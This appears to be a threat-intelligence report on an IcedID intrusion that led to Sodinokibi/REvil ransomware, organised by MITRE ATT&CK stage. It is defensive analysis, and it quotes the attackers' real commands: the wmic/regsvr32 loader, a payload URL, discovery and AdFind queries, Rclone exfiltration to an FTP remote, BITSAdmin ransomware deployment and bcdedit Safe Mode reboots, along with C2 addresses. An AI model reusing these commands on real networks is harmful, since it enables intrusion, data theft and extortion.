# Case Summary

The IcedID trojan was first discovered in 2017 and currently operates as an initial access broker for several ransomware families. In our intrusion, the threat actors leveraged malicious spam using an xlsm document which, upon opening and enabling the macro, initiated a wmic command to execute the IcedID trojan from a remote executable posing as a GIF image.

Persistence was setup using a scheduled task and discovery commands were initiated from the malware within minutes of execution. About an hour and a half after initial access, the malware pulled down Cobalt Strike Beacons from 2 different command and control servers, which were both used through-out the intrusion. Once the Cobalt Strike Beacons were established, lateral movement began, first to an Exchange server, then pivoting to other servers. We did not see the attackers interact with the Exchange application at all; and at first, it appeared the attack came from Exchange, but after careful review, we assessed the source was indeed IcedID. #ArtifactsMatter. It appears the threat actors wanted us to believe Exchange was the source of attack as they pivoted through Exchange to other systems in the domain using Cobalt Strike.

After compromising the Exchange server, the attackers moved to domain controllers and other systems within the environment using SMB and PowerShell Beacons executed via a remote service. The attackers were slightly slowed down by AntiVirus, which ate a couple Beacons but the attackers eventually bypassed it using a variation of their lateral movement technique.

Additional discovery was executed from the domain controller using AdFind and the Ping utility to test connections between the domain controller and other domain joined systems. After discovery was completed, credentials were dumped from lsass. After completing these tasks the threat actors began to establish RDP connections between various systems in the domain.

Three and a half hours into the intrusion, the threat actors used Rclone masquerading as a svchost executable to collect and exfiltrate the contents of network shares for use in a double extortion demand.

At the four hour mark, the threat actors began to move on to final objectives. They staged the ransomware executable on a domain controller and then used BITSAdmin to download it to each system in the domain. After that, the threat actors used RDP to open a cmd or PowerShell process to then execute the Sodinokibi ransomware using a particular flag -smode, which when executed, wrote a couple RunOnce registry keys and then immediately rebooted the system into Safe Mode with Networking. Encryption did not start immediately after reboot but required a user to log in, which in this case the threat actors completed by logging in after the reboot.

Booting into Safe Mode with Networking blocked the startup of security tools and other management agents. Networking worked, but because services couldn’t start, we were unable to remotely manage the systems using our normal tools. We believe this process would have stopped some EDR agents from starting up and possibly detecting the ransomware execution.

On certain systems, ransomware was executed without the -smode flag, and on other systems a dll was executed via rundll32 to encrypt the system without requiring a reboot and allowing the threat actors to remain present while the encryption process completed.

About 4.5 hours after initial access, the threat actors had completed their mission of encrypting all domain joined systems. The ransomware note left by the infection included a link to their site on Tor which put the price tag for decryption around $200k if paid within 7 days. If we didn’t pay within 7 days the price goes up to around $400k. The ransom is required to be paid in Monero instead of the usual Bitcoin. This may be in an effort to better shield the payments from tracing activity like those performed by Chainaylsis. The threat actors identified themselves on their site as Sodinokibi and linked to a Coveware blog to provide assurance that if paid their decryption would be successful.

# analysis

# MITRE ATT&CK

Initial access for this intrusion was via a malspam campaign, while expecting Qbot downloads we found that IcedID was the payload choice delivered this time, similar to activity noted recently by James Quinn.

The delivery format was an xlsm file:

Initial execution of the document writes a file to:

C:\Users\Public\microsoft.security

The Excel file called wmic to execute the file with regsrv32

wmic.exe process call create 'regsvr32 -s C:\Users\Public\microsoft.security'

This then made a network request to download a file from this URL

http://vpu03jivmm03qncgx.com/index.gif

The GIF however was the IcedID malware.

Once IcedID was downloaded to the host, the malware was executed using rundll32.exe

rundll32.exe "C:\Users\USERNAME\AppData\Local\Temp\skull-x64.dat",update /i:"DwarfWing\license.dat"



After execution, the malware made contact with 161.35.109[.]168 which it continued to beacon to, throughout the intrusion.

# Persistence

IcedID setup persistence on the beach head host using a scheduled task.

wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D}

The execution of the ransomware executable created a RunOnce key for persistence.

HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*AstraZeneca

# Privilege Escalation

After completing LDAP discovery (BloodHound), the Cobalt Strike Beacon running in the wuauclt.exe process executed several PowerShell functions for UAC bypasses including:
- UAC-TokenMagic
- Invoke-SluiBypass

About one and a half hours after initial access, IcedID reached out to two Cobalt Strike servers.

Process injection was used multiple times across the environment using Cobalt Strike Beacons.

Prior to executing the ransomware, the threat actors created a GPO to disable Windows Defender across all systems/OUs.

The GPO was named “new”.

# Credential Access

Credentials were dumped on a server and domain controller using a Cobalt Strike Beacon.

Initial discovery by the IcedID malware occurred within minutes of execution:
- cmd.exe /c chcp >&2
- WMIC.exe WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List
- ipconfig.exe ipconfig /all
- systeminfo
- net config workstation
- nltest /domain_trusts
- nltest /domain_trusts /all_trusts
- net view /all /domain
- net view /all
- net.exe net group "Domain Admins" /domain



A flurry of LDAP queries were seen coming from wuauclt.exe (Cobalt Strike) on the beachhead.

We believe that activity was related to a Bloodhound scan, as seconds later we see BloodHound results dropped to disk before being deleted.

Once on the Exchange server in the environment, the threat actor performed DNS requests for all domain joined systems and pinged a few to check connectivity.

AdFind was executed on a domain controller to gather additional info such as name, OS, and DNS name.

cmd.exe /C adfind.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > some.csv

# Lateral Movement

For lateral movement, the threat actors used various techniques across the domain, one method being Cobalt Strike.

Cobalt Strike Beacon executables were transferred using SMB and executed via a remote service.

On other systems, PowerShell was used with the same remote service execution.

To facilitate the final ransomware deployment, RDP connections were initiated from a domain controller as well as a secondary server in the environment.

# Collection

The Rclone utility was used to collect information from file shares and to exfiltrate the data.

svchost.exe --config svchost.conf --progress --no-check-certificate copy "\\ServerName\C$\ShareName" ftp1:/DomainName/FILES/C/ShareName

# IcedID:

Data that was collected from the domain was exfiltrated to a remote server at:

45.147.160.5:443

For the final actions, the threat actors dropped a ransomware executable on the domain controller in C:\Windows and then used BITSAdmin to deploy the executable to remote systems.

C:\Windows\system32\bitsadmin.exe /transfer debjob /download /priority normal \\DOMIANCONTROLLER\c$\windows\DOMAINNAME.exe C:\Windows\DOMAINNAME.exe

The -smode flag was used with the ransomware executable to set the system to reboot into Safe Mode with Networking as noted by Malwarehunterteam.

Not remember seeing these before in REvil ransomware samples.

🤔

So basically the actors using REvil now can use it to reboot target machines into safe mode with networking…@demonslay335 @VK_Intel pic.twitter.com/dLk4EirNFO — MalwareHunterTeam (@malwrhunterteam) March 18, 2021

See below for -smode execution:

The *franceisshit key was used to boot the machine out of Safe Mode upon restarting the machine.

The systems rebooted into Safe Mode with Networking after running this smode command and were left at a login screen. About 10-20 seconds after logging in, all user files were encrypted and a ransom note was placed in numerous locations including the Desktop. Services were not able to be started, which led to collection issues, as normal agents did not start. This also included the startup of EDR and management agents.

We’ve seen at least one tweet about smode setting auto login keys, but we did not see that in our case and were not able to recreate that situation.

# REvil v2.05



-smode switch configures OS to boot into safe mode w/ networking via:



(pre-Vista) bootcfg /raw /a /safeboot:network /id 1

or

(Vista+) bcdedit /set {current} safeboot network



configures auto-lognn via WinLogon 🔑 w/ 'DTrump4ever' password — R3MRUM (@R3MRUM) March 26, 2021

After rebooting out of Safe Mode, you are left with the following desktop:

On certain systems, like the domain controllers, the threat actors chose to not use the Safe Mode option, and instead they used a dll executed by rundll32 to encrypt the system with no reboot, allowing the threat actors to maintain access while the ransomware was encrypting files.

C:\Windows\system32\rundll32.exe" C:\Windows\DomainName.dll,DllRegisterServer

The threat actors asked for 200k in Monero. They were talked down 20-30% and could have been talked down more. Here’s a few screenshots from the website.

With the help of @hatching_io (https://tria.ge/) we were able to parse the config from the ransomware sample.



# MITRE ATT&CK DATASET
Spearphishing Attachment - T1566.001

User Execution - T1204

Windows Management Instrumentation - T1047

Process Injection - T1055

Domain Trust Discovery - T1482

Domain Account - T1087.002

System Information Discovery - T1082

System Network Configuration Discovery - T1016

Security Software Discovery - T1518.001

SMB/Windows Admin Shares - T1021.002

Remote Desktop Protocol - T1021.001

Commonly Used Port - T1043

Application Layer Protocol - T1071

Exfiltration Over Asymmetric Encrypted Non-C2 Protocol - T1048.002

Data Encrypted for Impact - T1486

Malicious File - T1204.002

Command and Scripting Interpreter - T1059

PowerShell - T1059.001

Scheduled Task - T1053.005

Remote System Discovery - T1018

Rundll32 - T1218.011



